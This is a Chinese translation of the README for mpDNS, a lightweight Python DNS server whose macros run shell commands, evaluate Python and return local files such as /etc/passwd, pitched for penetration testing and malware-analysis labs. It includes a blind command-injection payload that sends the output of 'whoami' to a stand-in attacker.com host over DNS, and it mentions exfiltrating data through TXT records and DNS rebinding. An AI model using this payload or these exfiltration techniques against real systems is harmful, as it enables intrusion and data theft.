**简单、可配置的“ clone和run ”DNS服务器，具有多种有用的功能。**

> 适用于Python 2和3
>
> names.db - >包含所有自定义记录（参见示例）
>
> 简单的通配符，如* .example.com
>
> 捕获unicode dns请求
>
> 自定义动作又称宏：
>
> \- `{{shellexec::dig google.com +short}}` \- >执行shell命令并使用result响应
>
> \- `{{eval::res = '1.1.1.%d' % random.randint(0,256)}}`\- >评估你的python代码
>
> \- `{{file::/etc/passwd}}` \- >回复本地文件内容
>
> \- `{{resolve}}` \- >将DNS请求转发到本地系统DNS
>
> \- `{{resolve::example.com}}` \- >解析example.com而不是原始记录
>
> \- `{{echo}}` \- >回复对等地址
>
> \- `{{shellexec::echo %PEER% %QUERY%}}` \- >使用变量

支持的查询类型：`A`，`CNAME`，`TXT`

更新`names.db`记录而不重启/重新加载`./mpdns.py -e`

重度基于<https://github.com/circuits/circuits/blob/master/examples/dnsserver.py>

用法： `./mpdns.py`

编辑 **names.db** ，`./mpdns.py -e`无需重启

## 进攻和防守目的：

> 1.您需要一个轻量级的简单DNS服务器解决方案用于测试目的（不生产！）
>
> 2.测试Web应用程序中的各种盲注漏洞（例如/ping.php?ip=$(dig $(whoami).attacker.com)）
>
> 3.在一个`TXT`查询中轻松渗透65K数据
>
> 4.DNS重新绑定
>
> 5.对特定查询执行自定义宏操作（在恶意软件分析实验室环境中很有用）
>
> 6.还有更多。它是高度可定制的。

## 安装

git clone <https://github.com/nopernik/mpDNS>

## 限制

> 1.由于UDP数据报限制为65535字节，DNS响应限制在约65200字节，
> 此限制适用于`TXT`分成256字节块的记录，直到响应达到最大允许值65200b，
> 因此`TXT`宏记录`{{file:localfile.txt}}`限制为65200字节。
>
> 2.不支持嵌套通配符 **test.*.example.com**
>
> **3.**`{{resolve::example.com}}`宏中不支持自定义DNS服务器解析程序
>
> 4.`TTL`始终设为 **0**

例子

 **names.db示例：**

    
    
    # Empty configuration will result in empty but valid responses
    #
    # Unicode domain names are not supported but still can be catched by the server.
    # for example мама-сервер-unicode.google.com will be catched but with SERVFAIL response
    passwd.example.com    TXT     {{file::/etc/passwd}}  #comments are ignored
    shellexec            TXT     {{shellexec::whoami}}
    eval                TXT     {{eval::import random; res = random.randint(1,500)}}
    resolve1            A       {{resolve}}
    resolve2            A       {{resolve::self}}      #same as previous
    resolve3            A       {{resolve::example.com}}
    blabla.com            A       5.5.5.5
    *                    A       127.0.0.1
    *.example.com        A        7.7.7.7
    c1.example.com        CNAME    c2.example.com
    c2.example.com        CNAME    c3.example.com
    c3.example.com        CNAME    google.example.com
    google.example.com    CNAME    google.com
    test.example.com    A        8.8.8.8
    google.com            A        {{resolve::self}}
    notgoogle.com        A        {{resolve::google.com}}
    

## 使用names.db示例输出示例：

 **DB的定期解决方案** ：`dig test.example.com @localhost`

    
    
    ;; ANSWER SECTION:
    test.example.com.    0    IN    A    8.8.8.8
    

mpDNS输出： `- Request from 127.0.0.1:57698 -> test.example.com. -> 8.8.8.8 (A)`

 **递归CNAME解析** ：`dig c1.example.com @localhost`

    
    
    ;; QUESTION SECTION:
    ;c1.example.com.            IN    A
    ;; ANSWER SECTION:
    c1.example.com.        0    IN    CNAME    c2.example.com.
    c2.example.com.        0    IN    CNAME    c3.example.com.
    c3.example.com.        0    IN    CNAME    google.example.com.
    google.example.com.    0    IN    CNAME    google.com.
    google.com.        0    IN    A    216.58.206.14
    

mpDNS输出：

    
    
    - Request from 127.0.0.1:44120      -> c1.example.com.        -> c2.example.com (CNAME)
    - Request from 127.0.0.1:44120      -> c2.example.com        -> c3.example.com (CNAME)
    - Request from 127.0.0.1:44120      -> c3.example.com        -> google.example.com (CNAME)
    - Request from 127.0.0.1:44120      -> google.example.com    -> google.com (CNAME)
    - Request from 127.0.0.1:44120      -> google.com            -> {{resolve::self}} (A)
    

**通配符解析** ：`dig not-in-db.com @localhost`

    
    
    ;; ANSWER SECTION:
    not-in-db.com.        0    IN    A    127.0.0.1
    

## mpDNS输出：

`- Request from 127.0.0.1:38528 -> not-in-db.com. -> 127.0.0.1 (A)`

 **通配符子域解析** ：`dig wildcard.example.com @localhost`

    
    
    ;; ANSWER SECTION:
    wildcard.example.com.    0    IN    A    7.7.7.7
    

## mpDNS输出：

`- Request from 127.0.0.1:39691 -> wildcard.example.com. -> 7.7.7.7 (A)`

 **转发请求宏** ：`dig google.com @localhost`

    
    
    ;; ANSWER SECTION:
    google.com.        0    IN    A    172.217.22.110
    

## mpDNS输出：

`- Request from 127.0.0.1:53487 -> google.com. -> {{resolve::self}} (A)`

 **自定义域宏的转发请求** ：`dig notgoogle.com @localhost`

    
    
    ;; ANSWER SECTION:
    notgoogle.com.        0    IN    A    172.217.22.110
    

## mpDNS输出：

`- Request from 127.0.0.1:47797 -> notgoogle.com. -> {{resolve::google.com}}
(A)`

 **通过TXT查询文件内容宏** ：`dig txt passwd.example.com @localhost`

    
    
    ;; ANSWER SECTION:
    passwd.example.com.    0    IN    TXT    "root:x:0:0:root:/root:/bin/bash\010daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\010bin:x:2:2:bin:......stripped"
    

## mpDNS输出：

`- Request from 127.0.0.1:38805 -> passwd.example.com. ->
['root:x:0:0:root...(2808)'] (TXT)`

 **通过TXT查询自定义python代码宏** ：`dig txt eval @localhost`

    
    
    ;; ANSWER SECTION:
    eval.            0    IN    TXT    "320"
    

## mpDNS输出：

`- Request from 127.0.0.1:33821 -> eval. -> ['320'] (TXT)`

 **Shell命令宏通过TXT查询** ：`dig txt shellexec @localhost`

    
    
    ;; ANSWER SECTION:
    shellexec.        0    IN    TXT    "root"
    

## mpDNS输出：

`- Request from 127.0.0.1:50262 -> shellexec. -> ['root'] (TXT)`

***参考来源[github](https://github.com/nopernik/mpDNS)，由周大涛编译，转载请注明来自FreeBuf.COM。**

